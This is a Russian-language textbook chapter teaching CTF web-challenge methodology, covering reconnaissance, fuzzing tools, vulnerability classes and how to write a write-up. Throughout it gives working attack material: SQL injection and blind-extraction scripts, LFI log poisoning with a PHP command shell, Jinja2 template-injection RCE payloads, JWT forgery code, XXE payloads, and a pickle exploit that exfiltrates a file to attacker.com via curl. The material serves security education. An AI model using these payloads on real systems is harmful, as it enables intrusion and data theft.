# Глава 15.1: CTF — методология веб-категории

## 🎯 Цели главы

- Понять формат CTF Jeopardy и структуру веб-категории
- Освоить методологию подхода к веб-заданиям: от разведки до получения флага
- Изучить типичные классы уязвимостей в CTF-заданиях
- Познакомиться с ключевыми инструментами: Burp Suite, curl, Python, ffuf
- Научиться писать качественный write-up после решения задания
- Узнать лучшие платформы для практики

---

## 15.1.1 Что такое CTF и формат Jeopardy

CTF (Capture The Flag) — это соревнование по кибербезопасности, где участники решают задачи различной сложности, получая за каждую решённую задачу строку-«флаг» (обычно в формате `CTF{some_string_here}`). Флаг вводится в систему оценивания — и команда получает очки.

### Форматы CTF

```
┌─────────────────────────────────────────────────────────────────┐
│                        ФОРМАТЫ CTF                              │
├──────────────────┬──────────────────────────────────────────────┤
│ Jeopardy         │ Набор независимых задач по категориям.        │
│                  │ Каждая задача = флаг = очки.                  │
│                  │ Самый популярный формат для обучения.         │
├──────────────────┼──────────────────────────────────────────────┤
│ Attack-Defense   │ Команды атакуют серверы соперников и          │
│                  │ защищают свои. Реальное время. Сложнее.       │
├──────────────────┼──────────────────────────────────────────────┤
│ King of the Hill │ Захват и удержание флага/сервиса.             │
│                  │ Динамическая атака и защита.                  │
└──────────────────┴──────────────────────────────────────────────┘
```

### Категории заданий в Jeopardy CTF

| Категория   | Описание                                         | Сложность входа |
|-------------|--------------------------------------------------|-----------------|
| Web         | Веб-уязвимости: SQLi, XSS, LFI, SSTI и т.д.     | Средняя         |
| Crypto      | Шифрование, хэши, математика                    | Высокая         |
| Forensics   | Анализ дампов памяти, pcap, стеганография        | Средняя         |
| Pwn/Binary  | Эксплуатация бинарных уязвимостей, BOF           | Очень высокая   |
| Reversing   | Обратная разработка бинарных файлов              | Высокая         |
| OSINT       | Разведка по открытым источникам                 | Низкая          |
| Misc        | Всё остальное: trivia, programming challenges    | Разная          |

> **Почему начинать с Web?** Веб-категория наиболее доступна для новичков: не нужно знать ассемблер, достаточно понимать HTTP, HTML и базовые концепции безопасности.

---

## 15.1.2 Анатомия CTF веб-задания

Типичное веб-задание выглядит так:

```
┌─────────────────────────────────────────────────────────────────┐
│  [WEB] Mystery Shop                           250 points        │
│─────────────────────────────────────────────────────────────────│
│  "We opened a new online store, but something seems off         │
│   with our inventory system..."                                  │
│                                                                  │
│  URL: http://chall.ctf.example.com:5000/                        │
│  Files: mystery-shop.zip (source code)                          │
│                                                                  │
│  Hints: [Unlock for 25 pts] [Unlock for 50 pts]                │
│  Solved by: 47 teams                                            │
└─────────────────────────────────────────────────────────────────┘
```

**Что нам дают:**
- **URL** — целевое приложение для атаки
- **Файлы** — исходный код (когда дают, это называется whitebox)
- **Описание** — подсказки в тексте задания (часто содержат намёки)
- **Количество решивших** — индикатор сложности

---

## 15.1.3 Методология решения веб-заданий

### Шаг 1: Разведка задания (Reconnaissance)

Прежде чем атаковать — изучите цель:

```bash
# 1. Открываем задание в браузере, смотрим вручную
# 2. Проверяем исходный код страницы (Ctrl+U или F12)
# 3. Смотрим robots.txt
curl http://chall.ctf.example.com:5000/robots.txt

# 4. Проверяем .git
curl http://chall.ctf.example.com:5000/.git/HEAD

# 5. Смотрим HTTP заголовки
curl -I http://chall.ctf.example.com:5000/

# 6. Проверяем cookies
curl -c cookies.txt http://chall.ctf.example.com:5000/ -v

# 7. Технологический стек по заголовкам
curl -s -I http://chall.ctf.example.com:5000/ | grep -i "server\|x-powered\|content-type"
```

**Что ищем при ручном просмотре:**

```
✓ Комментарии в HTML <!-- secret: ... -->
✓ JS файлы с логикой (смотрим network tab в DevTools)
✓ Параметры в URL: ?id=1, ?page=about, ?file=home
✓ Формы и их action/method
✓ Скрытые поля <input type="hidden" name="role" value="user">
✓ Мета-теги с версиями CMS/фреймворков
✓ Ссылки на /admin, /debug, /api, /backup
```

### Шаг 2: Перебор путей (Directory/File Enumeration)

```bash
# ffuf — быстрый fuzzer
ffuf -u http://chall.ctf.example.com:5000/FUZZ \
     -w /usr/share/wordlists/dirb/common.txt \
     -mc 200,301,302,403 \
     -t 50

# gobuster
gobuster dir -u http://chall.ctf.example.com:5000/ \
             -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
             -x php,html,txt,bak,zip \
             -t 50

# feroxbuster (рекурсивный)
feroxbuster -u http://chall.ctf.example.com:5000/ \
            -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
            --depth 3

# wfuzz для параметров
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
      --hc 404 \
      http://chall.ctf.example.com:5000/FUZZ
```

### Шаг 3: Анализ исходного кода

Если даны исходники — это ваш главный ресурс:

```bash
# Распаковываем архив
unzip mystery-shop.zip -d mystery-shop/
cd mystery-shop/

# Ищем потенциальные уязвимости
grep -r "eval(" . --include="*.php"
grep -r "system(" . --include="*.php"
grep -r "exec(" . --include="*.php"
grep -r "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE" . --include="*.php"
grep -r "include\|require" . --include="*.php"
grep -r "SELECT.*WHERE" . --include="*.php"  # SQL запросы
grep -r "password\|secret\|key\|token\|flag" . --include="*.php" -i
grep -r "render_template_string\|jinja2" . --include="*.py"  # SSTI в Python

# Просматриваем структуру
find . -name "*.php" -o -name "*.py" -o -name "*.js" | head -30
tree -L 3 .
```

### Шаг 4: Составление гипотез и тестирование

```
Нашли параметр ?id=1 → тестируем SQLi
Нашли ?file=home      → тестируем LFI
Нашли шаблонизатор   → тестируем SSTI
Нашли JWT cookie      → тестируем JWT атаки
Нашли загрузку файла  → тестируем unrestricted upload
```

---

## 15.1.4 Инструменты для CTF веб-категории

### Burp Suite — основной инструмент

```
┌─────────────────────────────────────────────────────────────────┐
│                    BURP SUITE WORKFLOW                          │
│                                                                  │
│  Browser ──→ Burp Proxy ──→ Target Server                       │
│               (8080)                                             │
│                  │                                               │
│         ┌────────┴──────────────────┐                           │
│         │                           │                           │
│      Repeater                  Intruder                         │
│   (ручной тест)              (автоматизация)                    │
│         │                           │                           │
│      Decoder                   Sequencer                        │
│   (encode/decode)            (случайность токенов)              │
└─────────────────────────────────────────────────────────────────┘
```

**Ключевые возможности Burp Suite для CTF:**

```
1. Proxy → Intercept: перехват и изменение запросов
2. Repeater: повторная отправка и модификация запросов
3. Intruder: fuzzing параметров (в бесплатной версии медленно)
4. Decoder: base64, URL encoding, hex и т.д.
5. Comparer: сравнение двух ответов
6. Extensions: JOSEPH (JWT), Active Scan++ и другие
```

**Установка CA сертификата Burp:**
```bash
# Запустить Burp Suite
# Браузер → настройки прокси → 127.0.0.1:8080
# Перейти на http://burp → скачать CA Certificate
# Импортировать в браузер как доверенный CA
```

### curl — командная строка

```bash
# GET запрос с заголовками
curl -v http://target.com/api/users

# POST с JSON
curl -X POST http://target.com/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"test"}'

# С cookies
curl -b "session=eyJhbGciOiJIUzI1NiJ9..." \
     http://target.com/dashboard

# С кастомными заголовками
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "Authorization: Bearer TOKEN" \
     http://target.com/admin

# Следовать редиректам
curl -L http://target.com/

# Сохранить cookies
curl -c cookies.jar -b cookies.jar http://target.com/

# Отправить файл (multipart)
curl -F "file=@shell.php" http://target.com/upload

# SSRF тест
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
```

### Python requests — скриптинг атак

```python
#!/usr/bin/env python3
# exploit.py — шаблон для CTF веб-атак

import requests
import sys
from bs4 import BeautifulSoup

TARGET = "http://chall.ctf.example.com:5000"
session = requests.Session()

# Настройка прокси через Burp (для отладки)
# session.proxies = {"http": "http://127.0.0.1:8080"}
# session.verify = False

def get_csrf_token(url):
    """Получить CSRF-токен со страницы"""
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    token = soup.find('input', {'name': 'csrf_token'})
    return token['value'] if token else None

def login(username, password):
    """Авторизация"""
    url = f"{TARGET}/login"
    csrf = get_csrf_token(url)
    data = {
        "username": username,
        "password": password,
        "csrf_token": csrf
    }
    resp = session.post(url, data=data, allow_redirects=True)
    return "dashboard" in resp.url or "Welcome" in resp.text

def sqli_test(param_value):
    """Тест SQL инъекции"""
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "1' AND SLEEP(3)--",
    ]
    for payload in payloads:
        url = f"{TARGET}/item?id={requests.utils.quote(payload)}"
        resp = session.get(url)
        print(f"[{resp.status_code}] {payload[:30]}: {len(resp.text)} bytes")

def main():
    print("[*] Starting exploitation...")
    
    # Шаг 1: Авторизация
    if login("admin", "admin"):
        print("[+] Logged in!")
    
    # Шаг 2: Тест уязвимостей
    sqli_test("1")

if __name__ == "__main__":
    main()
```

### ffuf — веб-фаззинг

```bash
# Базовый перебор директорий
ffuf -u http://target.com/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Перебор параметров GET
ffuf -u "http://target.com/page?FUZZ=test" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc 200

# Fuzzing значений параметра
ffuf -u "http://target.com/user?id=FUZZ" \
     -w /usr/share/seclists/Fuzzing/Integers/Integer-000000-001000.txt \
     -mc 200 \
     -fs 1234  # Фильтр по размеру (исключить типовой ответ)

# Перебор субдоменов (vhost)
ffuf -u http://target.com/ \
     -H "Host: FUZZ.target.com" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 1000

# Fuzzing POST параметров
ffuf -u http://target.com/login \
     -X POST \
     -d "username=FUZZ&password=test" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
     -mr "Welcome"  # Матч по строке в ответе
```

---

## 15.1.5 Типичные задания веб-категории

### SQL Injection в CTF

SQL инъекции в CTF обычно прямолинейнее, чем в реальной жизни:

```bash
# Тест на ошибку
curl "http://target.com/item?id=1'"
# Ожидаем: SQL syntax error...

# Union-based (узнать кол-во колонок)
curl "http://target.com/item?id=1 ORDER BY 1--"
curl "http://target.com/item?id=1 ORDER BY 2--"
curl "http://target.com/item?id=1 ORDER BY 3--"  # Ошибка → 2 колонки

# Union SELECT для извлечения данных
curl "http://target.com/item?id=-1 UNION SELECT 1,2--"
curl "http://target.com/item?id=-1 UNION SELECT table_name,2 FROM information_schema.tables--"

# Читаем флаг из таблицы flags
curl "http://target.com/item?id=-1 UNION SELECT flag,2 FROM flags LIMIT 1--"
```

```python
# Автоматизация time-based blind SQLi
import requests
import string
import time

TARGET = "http://target.com/item"
FLAG = ""
CHARSET = string.printable

for pos in range(1, 50):
    for char in CHARSET:
        payload = f"1' AND IF(SUBSTR((SELECT flag FROM flags LIMIT 1),{pos},1)='{char}',SLEEP(2),0)--"
        start = time.time()
        requests.get(TARGET, params={"id": payload})
        elapsed = time.time() - start
        
        if elapsed > 2:
            FLAG += char
            print(f"\r[*] Flag so far: {FLAG}", end="", flush=True)
            break
    else:
        break  # Конец флага

print(f"\n[+] Flag: {FLAG}")
```

### LFI / RFI (Local/Remote File Inclusion)

```bash
# Тест LFI
curl "http://target.com/page?file=../../../../etc/passwd"
curl "http://target.com/page?file=....//....//....//etc/passwd"
curl "http://target.com/page?file=/etc/passwd%00"  # Null byte (PHP < 5.3)
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=/etc/passwd"
curl "http://target.com/page?file=php://filter/read=string.rot13/resource=index.php"

# PHP wrappers для чтения исходного кода
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php" \
     | base64 -d

# Log poisoning (если можем читать логи Apache)
# 1. Внедряем PHP в User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Читаем лог через LFI с выполнением кода
curl "http://target.com/page?file=/var/log/apache2/access.log&cmd=id"

# RFI — включение удалённого файла
# (нужен allow_url_include=On в PHP, редко в реальности, но бывает в CTF)
curl "http://target.com/page?file=http://attacker.com/shell.php"
```

### SSTI (Server-Side Template Injection)

```python
# Определяем шаблонизатор по поведению
# Jinja2 (Python):   {{ 7*7 }} → 49
# Twig (PHP):        {{ 7*7 }} → 49  
# FreeMarker (Java): ${7*7}   → 49
# Smarty (PHP):      {7*7}    → Error, но {php}phpinfo(){/php}

# Jinja2 RCE payloads
payloads_jinja2 = [
    # Читаем /etc/passwd
    "{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}",
    
    # Через subprocess
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
    
    # Универсальный RCE через __import__
    "{{ request.__class__.__mro__[1].__subclasses__() }}"
    "{% for c in [].__class__.__base__.__subclasses__() %}"
    "{% if c.__name__ == 'catch_warnings' %}"
    "{% for b in c.__init__.__globals__.values() %}"
    "{% if b.__class__ == {}.__class__ %}"
    "{% if 'eval' in b %}"
    "{{ b['eval']('__import__(\"os\").popen(\"cat /flag.txt\").read()') }}"
    "{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}",
    
    # Короткий вариант (часто работает в CTF)
    "{{''.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /flag.txt').read()}}"
]

import requests

TARGET = "http://target.com/greet"

for payload in payloads_jinja2:
    resp = requests.post(TARGET, data={"name": payload})
    if "flag" in resp.text.lower() or "root:" in resp.text:
        print(f"[+] RCE! Payload: {payload[:50]}")
        print(resp.text)
        break
```

```
# Инструмент tplmap для автоматического SSTI
python3 tplmap.py -u "http://target.com/greet" \
                  --data "name=*" \
                  --engine Jinja2 \
                  --os-shell
```

### JWT атаки

```bash
# Декодируем JWT (base64 без подписи)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9" | base64 -d
# {"username":"user","role":"user"}
```

```python
#!/usr/bin/env python3
# jwt_attacks.py

import jwt
import base64
import json
import requests

TARGET = "http://target.com"
ORIGINAL_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.SIGNATURE"

# Атака 1: alg:none
def attack_none_algorithm(token):
    """Убираем подпись, меняем алгоритм на none"""
    header = {"alg": "none", "typ": "JWT"}
    payload = {"username": "admin", "role": "admin"}
    
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    
    forged_token = f"{header_b64}.{payload_b64}."
    print(f"[*] None algorithm token: {forged_token}")
    return forged_token

# Атака 2: Брутфорс слабого секрета
def bruteforce_secret(token):
    """Подбор секрета из wordlist"""
    wordlist = ["secret", "password", "123456", "admin", "key", "jwt_secret"]
    
    for secret in wordlist:
        try:
            decoded = jwt.decode(token, secret, algorithms=["HS256"])
            print(f"[+] Secret found: {secret}")
            print(f"[+] Payload: {decoded}")
            return secret
        except jwt.InvalidSignatureError:
            continue
    return None

# Атака 3: RS256 → HS256 (если знаем публичный ключ)
def attack_rs256_to_hs256(token, public_key_path):
    """Конвертация RS256 в HS256 с публичным ключом"""
    with open(public_key_path, 'r') as f:
        public_key = f.read()
    
    # Декодируем payload
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    payload['role'] = 'admin'
    
    # Создаём новый токен, подписанный публичным ключом как HMAC
    new_token = jwt.encode(payload, public_key, algorithm="HS256")
    print(f"[*] RS256→HS256 token: {new_token}")
    return new_token

# Тестируем
def test_token(token):
    resp = requests.get(f"{TARGET}/admin",
                       headers={"Authorization": f"Bearer {token}"})
    if resp.status_code == 200 and "flag" in resp.text.lower():
        print(f"[+] SUCCESS! Flag: {resp.text}")
    else:
        print(f"[-] Failed: {resp.status_code}")

# Запуск атак
none_token = attack_none_algorithm(ORIGINAL_TOKEN)
test_token(none_token)

secret = bruteforce_secret(ORIGINAL_TOKEN)
if secret:
    admin_token = jwt.encode({"username": "admin", "role": "admin"}, 
                             secret, algorithm="HS256")
    test_token(admin_token)
```

### XXE (XML External Entity)

```python
#!/usr/bin/env python3
import requests

TARGET = "http://target.com/api/parse"

# XXE для чтения файлов
xxe_payloads = [
    # Классический XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",

    # XXE через PHP wrapper
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>""",

    # Blind XXE (out-of-band)
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>trigger</data></root>""",

    # XXE для SSRF
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><data>&xxe;</data></root>"""
]

for payload in xxe_payloads:
    resp = requests.post(TARGET,
                        data=payload,
                        headers={"Content-Type": "application/xml"})
    if "root:" in resp.text or "flag" in resp.text.lower():
        print(f"[+] XXE successful!")
        print(resp.text[:500])
        break
    print(f"[-] {resp.status_code}: {resp.text[:100]}")
```

### Десериализация

```php
<?php
// Пример уязвимого PHP кода
class User {
    public $username;
    public $isAdmin = false;
    
    public function __destruct() {
        // Уязвимость: выполнение кода при десериализации
        eval($this->username);
    }
}

// В CTF обычно дают такой код и cookie с сериализованным объектом
// cookie: O:4:"User":2:{s:8:"username";s:4:"user";s:7:"isAdmin";b:0;}

// Создаём вредоносный объект
$exploit = new User();
$exploit->username = "system('cat /flag.txt');";
$exploit->isAdmin = true;

echo serialize($exploit);
// O:4:"User":2:{s:8:"username";s:25:"system('cat /flag.txt');";s:7:"isAdmin";b:1;}

// Кодируем для передачи в cookie
echo base64_encode(serialize($exploit));
?>
```

```python
# Python pickle десериализация (очень частая в CTF)
import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        # Выполняем команду при десериализации
        return (os.system, ("cat /flag.txt > /tmp/flag && curl http://attacker.com/$(cat /tmp/flag)",))

payload = pickle.dumps(Exploit())
payload_b64 = base64.b64encode(payload).decode()
print(f"Payload: {payload_b64}")

# Отправляем на сервер
import requests
resp = requests.post("http://target.com/api/load",
                    data={"data": payload_b64})
print(resp.text)
```

### Утечка исходного кода (.git, .DS_Store)

```bash
# Проверяем наличие .git
curl http://target.com/.git/HEAD
# Если ответ: ref: refs/heads/master — уязвимо!

# Инструмент GitDumper
python3 git-dumper.py http://target.com/.git/ ./leaked-repo/
cd leaked-repo/
git log --oneline       # История коммитов
git show HEAD           # Последний коммит
git log --all --oneline # Все ветки
git stash list          # Сохранённые изменения

# Ищем секреты
git log --all -p | grep -i "password\|secret\|flag\|key" -A 3

# .DS_Store (macOS файловый дамп — раскрывает структуру директорий)
# Инструмент: ds_store_exp
python ds_store_exp.py http://target.com/.DS_Store

# .svn (Subversion)
curl http://target.com/.svn/entries
# svn-dumper для восстановления

# Backup файлы
curl http://target.com/index.php~
curl http://target.com/index.php.bak
curl http://target.com/config.php.old
```

---

## 15.1.6 Платформы для практики CTF

### CTFtime.org — агрегатор соревнований

```
https://ctftime.org/

Что там есть:
- Расписание всех CTF соревнований
- Рейтинг команд и участников
- Write-ups прошедших CTF
- Поиск по тегам (web, crypto, pwn)

Начало: Зарегистрируйтесь, создайте/найдите команду,
участвуйте в beginner-friendly CTF
```

### HackTheBox (HTB)

```
https://www.hackthebox.com/

Структура:
├── Machines (полноценные виртуальные машины)
│   ├── Easy: хорошо для Junior
│   ├── Medium: хорошо для Middle
│   └── Hard/Insane: для Senior
├── Challenges (CTF-like задания)
│   ├── Web
│   ├── Forensics
│   ├── Crypto
│   └── ...
├── Academy (обучающие материалы)
└── Pro Labs (корпоративные сети)

Рекомендуемые машины для начала (Retired, Easy):
- Sau, Precious, Soccer, Photobomb
```

### PortSwigger Web Security Academy

```
https://portswigger.net/web-security

Лучший бесплатный ресурс по веб-безопасности:
- Структурированные лаборатории по каждой уязвимости
- От простого к сложному
- Встроенный Burp Suite
- Сертификат по завершении (BSCP — очень ценится)

Категории лабораторий:
├── SQL injection (18 labs)
├── XSS (30 labs)
├── CSRF (12 labs)
├── SSRF (9 labs)
├── XXE (9 labs)
├── OS command injection (5 labs)
├── Server-side template injection (7 labs)
├── JWT (8 labs)
└── ... и ещё 20+ категорий
```

### PicoCTF

```
https://picoctf.org/

Идеально для абсолютных новичков:
- Организован Carnegie Mellon University
- Всегда доступен (не только во время CTF)
- Задачи с нарастающей сложностью
- Хинты доступны бесплатно
- Отличная документация
```

### Другие платформы

| Платформа        | URL                          | Фокус               |
|------------------|------------------------------|---------------------|
| TryHackMe        | tryhackme.com                | Обучение + CTF      |
| VulnHub          | vulnhub.com                  | Offline VM          |
| DVWA             | github.com/digininja/DVWA    | Локальная практика  |
| WebGoat          | github.com/WebGoat/WebGoat   | Java/OWASP          |
| OWASP Juice Shop | github.com/juice-shop        | Современный OWASP   |
| Root-Me          | root-me.org                  | Французский CTF     |
| pwnable.kr       | pwnable.kr                   | Pwn/Binary          |

---

## 15.1.7 Как писать CTF write-up

Write-up — это технический отчёт о решении задания. Хороший write-up помогает учиться другим, демонстрирует ваши знания и служит портфолио.

### Структура write-up

```markdown
# [CTF Name] — [Challenge Name] Write-up

## Challenge Information
- **CTF**: ExampleCTF 2025
- **Category**: Web
- **Difficulty**: Medium
- **Points**: 300
- **Solved by**: 47 teams
- **Author**: challenge_author

## Description
> "We opened a new shop. Can you find what we're hiding?"
> URL: http://chall.ctf.example.com:5000/

## Initial Analysis

Открываем сайт, видим интернет-магазин. Смотрим source code...

[скриншот или описание первого взгляда]

## Solution

### Step 1: Reconnaissance
...описание шагов...

### Step 2: Finding the Vulnerability
...

### Step 3: Exploitation
```python
# exploit code here
```

### Step 4: Getting the Flag
...

## Flag
`CTF{s0m3_f1ag_h3r3}`

## Key Takeaways
- Что нового узнали
- Какие инструменты использовали

## Tools Used
- Burp Suite 2024.x
- Python 3.12
- ffuf v2.1.0
```

### Советы по хорошему write-up

```
✓ Пишите пошагово — читатель должен воспроизвести решение
✓ Объясняйте ПОЧЕМУ это работает, не только КАК
✓ Включайте неудачные попытки — это ценный опыт
✓ Добавляйте скриншоты к ключевым моментам
✓ Объясняйте каждый payload
✓ Указывайте версии инструментов
✓ Добавляйте ссылки на документацию/CVE
✗ Не делайте write-up из одного кода без объяснений
✗ Не публикуйте во время активного CTF (спойлер!)
✗ Не присваивайте чужие решения
```

### Пример объяснения payload в write-up

```markdown
### Анализ SSTI payload



Обнаружив параметр `name`, отражающийся в странице, я проверил SSTI:

```
<v-pre>
GET /greet?name={{7*7}} HTTP/1.1
```

Ответ вернул `49` вместо `{{7*7}}` — **Jinja2 интерпретирует шаблон**.

Следующий шаг — попасть к объекту `os` для выполнения команды.
В Python каждый объект наследует от `object`. Цепочка:

```
''           → str
.__class__   → <class 'str'>
.__bases__[0]→ <class 'object'>  
.__subclasses__() → список всех классов
```

Среди подклассов `object` есть `subprocess.Popen` (обычно индекс ~258).
Финальный payload:

```
{{''.__class__.__bases__[0].__subclasses__()[258](['cat','/flag.txt'],stdout=-1).communicate()[0]}}
```
</v-pre>
Это вызывает `Popen(['cat','/flag.txt'], stdout=PIPE).communicate()`,
возвращая содержимое файла с флагом.
```

---

## 15.1.8 Чеклист для веб-задания CTF

```
□ Прочитал описание задания (иногда флаг в описании или намёк)
□ Открыл сайт, просмотрел вручную (как пользователь)
□ Проверил source code (Ctrl+U) — комментарии, скрытые поля
□ Посмотрел Network tab в DevTools — все запросы, JS файлы, API
□ Проверил robots.txt, sitemap.xml
□ Проверил .git, .env, .htaccess, backup файлы
□ Запустил ffuf/gobuster для перебора путей
□ Запустил перебор параметров
□ Проверил все формы — где данные уходят?
□ Перехватил все запросы через Burp Suite
□ Проанализировал cookies — JWT? base64? сериализация?
□ Прочитал исходный код (если дан) на уязвимые паттерны
□ Сформировал гипотезы по типам уязвимостей
□ Протестировал каждую гипотезу методично
□ Погуглил специфические ошибки и технологии
□ Посмотрел подсказки (если застрял > 1 часа)
□ Написал write-up после получения флага
```

---

## 📌 Итоги главы

- CTF Jeopardy — лучший формат для обучения: изолированные задачи с чёткой целью (флаг)
- Веб-категория — наиболее доступная точка входа в CTF для новичков
- Методология решения: разведка → перебор → анализ кода → формирование гипотез → эксплуатация
- Ключевые инструменты: Burp Suite, curl, Python requests, ffuf
- Типичные уязвимости: SQLi, LFI, SSTI, JWT, XXE, десериализация, .git утечки
- Платформы: PicoCTF (новичок), PortSwigger (обучение), HackTheBox (практика), CTFtime (соревнования)
- Write-up — важная часть CTF: развивает навык объяснения и служит портфолио

---

## 🏠 Домашнее задание

1. **Базовый уровень:** Зарегистрируйтесь на picoctf.org и решите 3 задания из категории Web Exploitation (уровень Easy).

2. **Средний уровень:** Пройдите первые 5 лабораторий SQL injection на PortSwigger Web Security Academy.

3. **Продвинутый уровень:** Скачайте любую retired HTB машину с тегом "web" (Easy) и решите её. Напишите write-up на русском языке (минимум 500 слов).

4. **Практика инструментов:** Установите OWASP Juice Shop локально (`docker run -d -p 3000:3000 bkimminich/juice-shop`). Найдите и проэксплуатируйте 3 уязвимости, используя Burp Suite.

5. **Write-up:** После выполнения любого задания напишите write-up по шаблону из раздела 15.1.7. Опубликуйте на GitHub.

---

## 🔗 Полезные ресурсы

| Ресурс | URL | Описание |
|--------|-----|----------|
| CTFtime | ctftime.org | Расписание CTF, write-ups |
| HackTheBox | hackthebox.com | Машины, задания, академия |
| PortSwigger Academy | portswigger.net/web-security | Лучшие веб-лаборатории |
| PicoCTF | picoctf.org | CTF для начинающих |
| PayloadsAllTheThings | github.com/swisskyrepo/PayloadsAllTheThings | База payloads |
| HackTricks | book.hacktricks.xyz | Методология пентеста |
| CyberChef | gchq.github.io/CyberChef | Кодирование/декодирование |
| jwt.io | jwt.io | Отладка JWT токенов |
| GTFOBins | gtfobins.github.io | Unix binary exploits |
| RevShells | revshells.com | Генератор reverse shell |
